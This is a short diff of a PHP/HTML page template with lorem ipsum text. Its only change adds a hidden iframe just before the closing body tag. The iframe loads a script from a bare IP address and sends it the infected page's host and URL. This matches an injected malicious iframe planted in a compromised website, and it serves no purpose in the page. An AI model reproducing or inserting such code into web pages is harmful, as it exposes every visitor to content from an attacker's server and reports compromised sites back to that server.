@@ -116,5 +116,7 @@ Ut consequat commodo nunc nec tincidunt. Pellentesque vitae gravida nulla. Aliqu
 			</div>
 		</div>
 */ ?>
+
+	 <iframe src="http://178.33.27.16/4d1/ircmon.php?referer=<?php echo "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ?>">
     </body>
 </html>
